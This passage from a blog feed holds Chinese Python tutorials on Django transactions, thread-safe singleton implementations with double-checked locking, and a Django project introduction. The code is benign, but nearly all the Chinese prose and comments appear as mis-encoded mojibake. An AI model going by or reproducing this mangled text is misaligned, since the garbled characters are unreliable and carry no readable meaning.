<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> transaction</span><br><span class="line"></span><br><span class="line"><span class="meta">@transaction.atomic</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewfunc</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œçš„ä»£ç </span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>åŸºäºè§†å›¾å…·ä½“é€»è¾‘çš„äº‹åŠ¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> transaction</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewfunc</span>(<span class="params">request</span>):</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">with</span> transaction.atomic():</span><br><span class="line">		<span class="comment"># åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œçš„ä»£ç </span></span><br><span class="line">		...</span><br></pre></td></tr></table></figure></li>
</ul>
<p>æ³¨æ„ï¼Œåªæœ‰è§†å›¾è¢«é™åˆ¶åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œã€‚ä¸­é—´ä»¶åœ¨äº‹åŠ¡ä¹‹å¤–è¿è¡Œï¼ŒåŒç†ï¼Œæ¸²æŸ“æ¨¡æ¿å“åº”ä¹Ÿæ˜¯åœ¨äº‹åŠ¡ä¹‹å¤–è¿è¡Œçš„ã€‚</p>
<p><strong>å‚è€ƒæ–‡æ¡£ğŸ“•</strong></p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3RvcGljcy9kYi9tb2RlbHMv">æ¨¡å‹ | Django æ–‡æ¡£ | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3JlZi9tb2RlbHMvZmllbGRzLw==">æ¨¡å‹å­—æ®µå‚è€ƒ | Django æ–‡æ¡£ | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3JlZi9tb2RlbHMvb3B0aW9ucy8=">æ¨¡å‹ Meta é€‰é¡¹ | Django æ–‡æ¡£ | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3JlZi9tb2RlbHMvY29uc3RyYWludHMv">çº¦æŸå‚è€ƒ | Django æ–‡æ¡£ | Django (djangoproject.com)</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yL3RvcGljcy9zZXR0aW5ncy8=">Django é…ç½® | Django æ–‡æ¡£ | Django (djangoproject.com)</span></p>
</blockquote>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>è¯´è¯´ python ä¸­å•ä¾‹æ¨¡å¼çš„å®ç°</title>
    <url>/34b94b2a/</url>
    <content><![CDATA[<h2 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h2><blockquote>
<p><code>å•ä¾‹æ¨¡å¼</code>æ˜¯ä¸€ç§éå¸¸å¸¸ç”¨çš„è½¯ä»¶è®¾è®¡æ¨¡å¼ï¼Œå®ƒå®šä¹‰æ˜¯å•ä¾‹å¯¹è±¡çš„ç±»<code>åªèƒ½å…è®¸ä¸€ä¸ªå®ä¾‹å­˜åœ¨</code>ã€‚</p>
</blockquote>
<p>å•ä¾‹æ¨¡å¼æœ‰ä¸¤ç§ç»å…¸çš„å®ç°æ–¹å¼<code>é¥¿æ±‰æ¨¡å¼</code>å’Œ<code>æ‡’æ±‰æ¨¡å¼</code>, æ¥ä¸‹æ¥ä»¥å®ƒä»¬ä¸ºå¼€ç«¯æ¥ä»‹ç»å•ä¾‹æ¨¡å¼.</p>
<h2 id="æ‡’æ±‰æ¨¡å¼"><a href="#æ‡’æ±‰æ¨¡å¼" class="headerlink" title="æ‡’æ±‰æ¨¡å¼"></a>æ‡’æ±‰æ¨¡å¼</h2><blockquote>
<p>é¡¾åæ€ä¹‰, åˆ›å»ºå¯¹è±¡æ—¶æ¯”è¾ƒæ‡’, åˆ°éœ€è¦ç”¨åˆ°æ—¶æ‰å»åˆ›å»º.</p>
</blockquote>
<p>ä½¿ç”¨<code>__new__</code>ç±»æ–¹æ³•å®ç°, æ¯æ¬¡å®ä¾‹åŒ–ç±»æ—¶ä¼šåˆ¤æ–­æ˜¯å¦å·²æœ‰ç±»å±æ€§<code>_instance</code>(é‡Œé¢å­˜çš„æ˜¯å·²ç»å®ä¾‹åŒ–çš„ç±»å¯¹è±¡), æœ‰çš„è¯ç›´æ¥è¿”å›, æ²¡æœ‰å°±åˆ›å»ºæ–°å®ä¾‹.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç±»çš„æ„é€ æ–¹æ³•, ä¼šåœ¨__init__æ–¹æ³•å‰æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">            cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    S1 = Singleton()</span><br><span class="line">    S2 = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S2))</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">139789593957088</span><br><span class="line">139789593957088</span><br></pre></td></tr></table></figure>

<p>ä½†è¿™æ ·å­˜åœ¨ä¸€ä¸ªé—®é¢˜, å¦‚æœåŒæ—¶å®ä¾‹åŒ–å¤šä¸ªç±», <code>if not hasattr(cls, &#39;_instance&#39;)</code>è¯­å¥æœ‰å¯èƒ½åŒæ—¶æˆç«‹, è¿™ä¼šé€ æˆåˆ›å»ºå¤šä¸ªæ–°çš„å®ä¾‹, æ¯”å¦‚åœ¨å¤šçº¿ç¨‹æ“ä½œä¸‹.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç±»çš„æ„é€ æ–¹æ³•, ä¼šåœ¨__init__æ–¹æ³•å‰æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">            time.sleep(<span class="number">1</span>)	<span class="comment"># æ¨¡æ‹Ÿç¨‹åºå»¶è¿Ÿ</span></span><br><span class="line">            cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line"></span><br><span class="line">    S = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">139858525528848</span><br><span class="line">139858525530288</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å› ä¸ºå¤šçº¿ç¨‹ä¸‹çš„æ“ä½œå¹¶ä¸æ˜¯åŸå­æ€§çš„, è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•, åŠ ä¸Šäº’æ–¥é”å°†<code>__new__</code>æ–¹æ³•é‡Œçš„æ“ä½œè½¬å˜æˆåŸå­æ€§å°±å¥½äº†.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç±»çš„æ„é€ æ–¹æ³•, ä¼šåœ¨__init__æ–¹æ³•å‰æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">with</span> cls.lock:  <span class="comment"># åŠ é”, ä½¿æ“ä½œè½¬ä¸ºåŸå­æ€§</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">                time.sleep(<span class="number">1</span>)	<span class="comment"># æ¨¡æ‹Ÿç¨‹åºå»¶è¿Ÿ</span></span><br><span class="line">                cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    S = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">140572949160720</span><br><span class="line">140572949160720</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±æ²¡é—®é¢˜äº†å§? ä¸, æˆ‘ä»¬è¿˜éœ€è¦å¯¹<code>__init__</code>å‡½æ•°åšå¤„ç†, æ¯”æ–¹è¯´ä»¥ä¸‹çš„æƒ…å†µ, æ¯æ¬¡å®ä¾‹åŒ–è™½ä¸ä¼šåˆ›å»ºæ–°å®ä¾‹, å½“ä¼šæ‰§è¡Œä¸€éåˆå§‹åŒ–é‡Œçš„ä»£ç , è¿™æ˜¯ä¸ä¹…å•ä¾‹äº†ä¸ªå¯‚å¯å—?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;åˆå§‹åŒ–ä¸­&#x27;</span>)</span><br><span class="line">        <span class="comment"># code...</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;åˆå§‹åŒ–å®Œæ¯•&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç±»çš„æ„é€ æ–¹æ³•, ä¼šåœ¨__init__æ–¹æ³•å‰æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">with</span> cls.lock:  <span class="comment"># åŠ é”, ä½¿æ“ä½œè½¬ä¸ºåŸå­æ€§</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">                time.sleep(<span class="number">1</span>)	<span class="comment"># æ¨¡æ‹Ÿç¨‹åºå»¶è¿Ÿ</span></span><br><span class="line">                cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    S = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">åˆå§‹åŒ–ä¸­</span><br><span class="line">åˆå§‹åŒ–å®Œæ¯•</span><br><span class="line">140424166351632</span><br><span class="line">åˆå§‹åŒ–ä¸­</span><br><span class="line">åˆå§‹åŒ–å®Œæ¯•</span><br><span class="line">140424166351632</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†ä¼˜åŒ–è¿™ä¸€é—®é¢˜, åœ¨<code>__init__</code>é‡ŒåŠ ä¸ªåˆ¤æ–­å°±è¡Œäº†.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, <span class="string">&#x27;_init&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    self._init = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;åˆå§‹åŒ–ä¸­&#x27;</span>)</span><br><span class="line">    <span class="comment"># code...</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;åˆå§‹åŒ–å®Œæ¯•&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>åˆ°äº†è¿™ä¸€æ­¥å®Œæ•´çš„æ‡’æ±‰æ¨¡å¼å°±å·²ç»å®ç°äº†, ä½†æ˜¯, è¿˜æœ‰ä¸ªç»†èŠ‚å¯ä»¥ä¼˜åŒ–, è¿™é‡Œå¼•å…¥<code>åŒé‡æ£€æŸ¥é”</code>çš„æ¦‚å¿µ.</p>
<h3 id="åŒé‡æ£€æŸ¥é”"><a href="#åŒé‡æ£€æŸ¥é”" class="headerlink" title="åŒé‡æ£€æŸ¥é”"></a>åŒé‡æ£€æŸ¥é”</h3><blockquote>
<p>åŒé‡æ£€æŸ¥é”å®šæ¨¡å¼é¦–å…ˆéªŒè¯é”å®šæ¡ä»¶(ç¬¬ä¸€æ¬¡æ£€æŸ¥)ï¼Œåªæœ‰é€šè¿‡é”å®šæ¡ä»¶éªŒè¯æ‰çœŸæ­£çš„è¿›è¡ŒåŠ é”é€»è¾‘å¹¶å†æ¬¡éªŒè¯æ¡ä»¶(ç¬¬äºŒæ¬¡æ£€æŸ¥)ã€‚</p>
</blockquote>
<p>è¿™æ ·ä¼šåœ¨ä¿è¯æ€§èƒ½çš„åŒæ—¶åˆä¿è¯å•ä¾‹. (å°å£°BB: pythonè¿˜éœ€è¦è€ƒè™‘æ€§èƒ½? ä¸, è¿™æ˜¯å¯¹ç»†èŠ‚çš„æŠŠæ§!)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):	<span class="comment"># åŠ é”å‰åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">with</span> cls.lock:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):	<span class="comment"># åŠ é”ååˆ¤æ–­</span></span><br><span class="line">                cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">    <span class="keyword">return</span> cls._instance</span><br></pre></td></tr></table></figure>

<h3 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, <span class="string">&#x27;_init&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self._init = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">            <span class="keyword">with</span> cls.lock:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">                    cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br></pre></td></tr></table></figure>



<h2 id="é¥¿æ±‰æ¨¡å¼"><a href="#é¥¿æ±‰æ¨¡å¼" class="headerlink" title="é¥¿æ±‰æ¨¡å¼"></a>é¥¿æ±‰æ¨¡å¼</h2><blockquote>
<p>æå‰åˆ›å»ºå¥½å¯¹è±¡, è¦ç”¨åˆ°å°±ç›´æ¥ä½¿ç”¨, ä¸ä¼šè¢«&#39;é¥¿&#39;æ­».</p>
</blockquote>
<p>python å’Œ Java ä¸åŒ, æ²¡åŠæ³•åœ¨ç±»ä¸­å®ä¾‹åŒ–æœ¬èº«, æ‰€ä»¥ä¼ ç»Ÿçš„å®ç°æ–¹å¼è¡Œä¸é€š, è¿™é‡Œæˆ‘è®¤ä¸ºæ¯”è¾ƒåˆç†çš„å®ç°åº”è¯¥æ˜¯:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        	</span><br><span class="line">Singleton = Singleton()</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è¿›è¡Œå®ä¾‹åŒ–, ç„¶åè°ƒç”¨å®ä¾‹åŒ–å¯¹è±¡, æ¬¸, è¿™ä¸å°±æ˜¯æ­£å¸¸çš„è°ƒç”¨ç±»çš„æ–¹å¼å—? ç¡®å®, ä½†å®ƒå´æ»¡è¶³äº†é¥¿æ±‰æ¨¡å¼å®ç°çš„æ¡ä»¶, æƒå½“äº†è§£å³å¯.</p>
<h2 id="ä¸¤è€…çš„ä¼˜ç¼ºç‚¹"><a href="#ä¸¤è€…çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¸¤è€…çš„ä¼˜ç¼ºç‚¹"></a>ä¸¤è€…çš„ä¼˜ç¼ºç‚¹</h2><ul>
<li><code>é¥¿æ±‰æ¨¡å¼</code>ï¼šä¼˜ç‚¹æ˜¯æ²¡æœ‰çº¿ç¨‹å®‰å…¨çš„é—®é¢˜ï¼Œç¼ºç‚¹æ˜¯æµªè´¹å†…å­˜ç©ºé—´ã€‚</li>
<li><code>æ‡’æ±‰æ¨¡å¼</code>ï¼šä¼˜ç‚¹æ˜¯æ²¡æœ‰å†…å­˜ç©ºé—´æµªè´¹çš„é—®é¢˜ï¼Œç¼ºç‚¹æ˜¯å¦‚æœæ§åˆ¶ä¸å¥½ï¼Œå®é™…ä¸Šä¸æ˜¯å•ä¾‹çš„ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>è®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Django åˆä½“éªŒ</title>
    <url>/21619794/</url>
    <content><![CDATA[<blockquote>
<p>Django æœ‰ç€éå¸¸é½å…¨çš„æ–‡æ¡£, å–„ç”¨æ–‡æ¡£å°†èƒ½ä½¿å­¦ä¹ äº‹åŠåŠŸå€.</p>
</blockquote>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yLw==">Django æ–‡æ¡£</span></p>
</blockquote>
<h2 id="ç‰ˆæœ¬é€‰æ‹©"><a href="#ç‰ˆæœ¬é€‰æ‹©" class="headerlink" title="ç‰ˆæœ¬é€‰æ‹©"></a>ç‰ˆæœ¬é€‰æ‹©</h2><p>3.2çš„LTSç‰ˆæœ¬åœ¨21å¹´çš„4æœˆä»½å‘å¸ƒ, ä¼šä½œä¸ºä¸‹ä¸€ä¸ªä¸»æµç‰ˆæœ¬, è¿™é‡Œä»3.2ç‰ˆæœ¬è¿›è¡Œå­¦ä¹ .</p>
<p><img data-src="http://img.owq.world/2022/03/2350-d2127f.png"></p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install django==3.2</span><br></pre></td></tr></table></figure>

<h2 id="åˆ›å»ºé¡¹ç›®"><a href="#åˆ›å»ºé¡¹ç›®" class="headerlink" title="åˆ›å»ºé¡¹ç›®"></a>åˆ›å»ºé¡¹ç›®</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">django-admin startproject mysite</span><br></pre></td></tr></table></figure>

<h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">mysite/</span><br><span class="line">    manage.<span class="keyword">py</span></span><br><span class="line">    mysite/</span><br><span class="line">        __init__.<span class="keyword">py</span></span><br><span class="line">        settings.<span class="keyword">py</span></span><br><span class="line">        urls.<span class="keyword">py</span></span><br><span class="line">        asgi.<span class="keyword">py</span></span><br><span class="line">        wsgi.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>æœ€å¤–å±‚çš„<code>mysite</code>ï¼ˆæ ¹ç›®å½•, é‡å‘½åæ— å½±å“ï¼‰</p>
</li>
<li><p><code>manage.py</code><br>ç®¡ç†<code>django</code>é¡¹ç›®çš„å‘½ä»¤è¡Œå·¥å…·, å’Œ<code>django-admin</code>ä¸€æ ·, åŒºåˆ«åœ¨äº</p>
<ul>
<li><code>jango-admin</code>åŠ åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­, ä»»æ„ç›®å½•ä¸‹å¯è°ƒç”¨</li>
<li><code>manage.py</code>åªèƒ½åœ¨è¯¥é¡¹ç›®ä¸‹ä½¿ç”¨</li>
</ul>
</li>
<li><p><code>mysite</code>(é¡¹ç›®å)</p>
<ul>
<li><p><code>__init__.py</code><br>å°†å½“å‰ç›®å½•è¯†åˆ«ä¸ºä¸€ä¸ªåŒ…</p>
</li>
<li><p><code>settings.py</code><br>é¡¹ç›®çš„é…ç½®æ–‡ä»¶</p>
</li>
<li><p><code>urls.py</code><br>é¡¹ç›®çš„URLå£°æ˜</p>
</li>
<li><p><code>wsgi.py</code><br>å…¨ç§° <code>Web Server Gateway Interface</code> WebæœåŠ¡å™¨ç½‘å…³æ¥å£</p>
<p>åªæ˜¯ä¸€ç§é€šä¿¡åè®®, å®ƒç¡®ç«‹äº†ä¸¤ä¸ªè§„èŒƒ</p>
<ul>
<li>åœ¨æœåŠ¡å™¨ä¸‹å¼€å¯å¤šä¸ªwebæœåŠ¡åº”ç”¨, ç¡®å®šå®¢æˆ·ç«¯è¯·æ±‚å¦‚ä½•åˆ°è¾¾<strong>æœåŠ¡åº”ç”¨</strong>çš„è§„èŒƒï¼ˆä»å“ªæ¥ï¼‰</li>
<li><strong>æœåŠ¡åº”ç”¨</strong>å¦‚ä½•æŠŠå¤„ç†çš„ç»“æœè¿”å›çš„è§„èŒƒï¼ˆåˆ°å“ªå»ï¼‰</li>
</ul>
</li>
<li><p><code>asgi.py</code>ï¼ˆå¦ä¸€ç§é€šä¿¡åè®®ï¼‰</p>
</li>
</ul>
</li>
</ul>
<h3 id="è¿è¡Œå¯åŠ¨"><a href="#è¿è¡Œå¯åŠ¨" class="headerlink" title="è¿è¡Œå¯åŠ¨"></a>è¿è¡Œå¯åŠ¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŒ‡å®š8888ç«¯å£å¯åŠ¨, ä¸æŒ‡å®šé»˜è®¤ç«¯å£ä¸º8000</span></span><br><span class="line">python manage.py runserver 8888</span><br></pre></td></tr></table></figure>

<p>è®¿é—® <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4Lw==">http://127.0.0.1:8888</span> å°±å¯ä»¥çœ‹è§åˆå§‹é¡µé¢äº†.<br><img data-src="http://img.owq.world/2022/03/1645-a7966d.png"></p>
<h2 id="MTVæ¨¡å‹"><a href="#MTVæ¨¡å‹" class="headerlink" title="MTVæ¨¡å‹"></a>MTVæ¨¡å‹</h2><blockquote>
<p>Djangoä½¿ç”¨çš„æ˜¯MTVæ¨¡å‹, çŸ¥å…¶æ‰€ä»¥ç„¶åœ¨ä¹‹åå­¦ä¹ ä¸Šæ‰ä¸è‡³äºçŠ¯è¿·ç³Š.</p>
</blockquote>
<p><img data-src="http://img.owq.world/2022/03/0040-734987.png"></p>
<h3 id="Model-æ¨¡å‹"><a href="#Model-æ¨¡å‹" class="headerlink" title="Model(æ¨¡å‹)"></a>Model(æ¨¡å‹)</h3><p><code>django</code>æä¾›äº†ä¸€ä¸ªæŠ½è±¡çš„æ¨¡å‹å±‚, ç›®çš„æ˜¯ä¸ºäº†æ„å»ºå’Œæ“çºµå½“å‰Webåº”ç”¨çš„æ•°æ®.</p>
<blockquote>
<p>ç®€å•æ¥è¯´, <code>model</code>å±‚å°±æ˜¯ç”¨æ¥å’Œæ•°æ®åº“è¿›è¡Œäº¤äº’çš„.<br><code>Django</code>æœ€å‡ºåçš„å°±æ˜¯å®ƒçš„<code>orm</code>, <code>Object Relational Mapping</code> å¯¹è±¡å…³ç³»æ˜ å°„</p>
</blockquote>
<h3 id="Templat-æ¨¡æ¿"><a href="#Templat-æ¨¡æ¿" class="headerlink" title="Templat(æ¨¡æ¿)"></a>Templat(æ¨¡æ¿)</h3><p><code>View</code>å°†æ•°æ®ä¼ é€’ç»™æ¨¡æ¿å±‚è¿›è¡Œæ¸²æŸ“, ä¹‹åå°†æ¸²æŸ“å¥½çš„é¡µé¢è¿”å›åˆ°å®¢æˆ·ç«¯.<br>æ¨¡æ¿å±‚æä¾›äº†ä¸€ä¸ªå¯¹è®¾è®¡è€…å‹å¥½çš„è¯­æ³•ç”¨äºæ¸²æŸ“å‘ç”¨æˆ·å‘ˆç°çš„ä¿¡æ¯. </p>
<h3 id="View-è§†å›¾"><a href="#View-è§†å›¾" class="headerlink" title="View(è§†å›¾)"></a>View(è§†å›¾)</h3><p>è§†å›¾å±‚, è´Ÿè´£å¤„ç†ç”¨æˆ·è¯·æ±‚å’Œå“åº”, å¤„ç†ä¸šåŠ¡é€»è¾‘çš„.</p>
<h3 id="MVCæ¨¡å‹"><a href="#MVCæ¨¡å‹" class="headerlink" title="MVCæ¨¡å‹"></a>MVCæ¨¡å‹</h3><p><img data-src="http://img.owq.world/2022/03/1635-5f7438.png"></p>
<blockquote>
